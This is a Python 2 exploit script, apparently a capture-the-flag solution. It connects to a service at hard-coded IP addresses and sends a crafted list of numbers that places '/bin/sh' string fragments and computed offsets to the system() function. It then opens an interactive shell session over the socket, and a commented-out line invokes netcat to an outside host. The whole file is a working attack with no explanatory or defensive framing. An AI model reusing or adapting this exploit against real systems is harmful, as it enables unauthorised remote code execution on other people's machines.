import socket
import struct
import time
import telnetlib
import string

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='=='):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

#host = '202.120.7.111'
host = '54.198.50.139'
port = 5455

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

sh1 = '0x622f2f2f'
sh2 = '0x732f6e69'
sh3 = '0x7d000068'

main_exit_addr = 0x19905
sys_addr = 0x41260
offset1 = sys_addr - main_exit_addr

offset2 = 0xbffff7b4 - 0xbffff728

print readuntil(f, 'numbers:\n')

payload = sh1 + ' ' + sh2 + ' ' + sh3 + (' ' + '0x88888881') * 29 + ' -0x20000000' + ' 0x70001111' + ' 0x30000000' + ' -0x20000000' + ' -0x50000000' + ' -0x50000000' + ' -0x50000000' + ' ' + '0xfffd86a5' + ' 0x48888888' + ' 140' + ' -0x20000000' + ' -0x20000000' + ' 0x78888884' + '\n\n'

print payload

f.write(payload)

print readuntil(f, 'come again!\n')

#f.write('nc 202.120.7.111 31337\n')

#print f.read(4096)

t = telnetlib.Telnet()
t.sock = s
t.interact()

#s.send('id\n')
#print s.recv(4096)





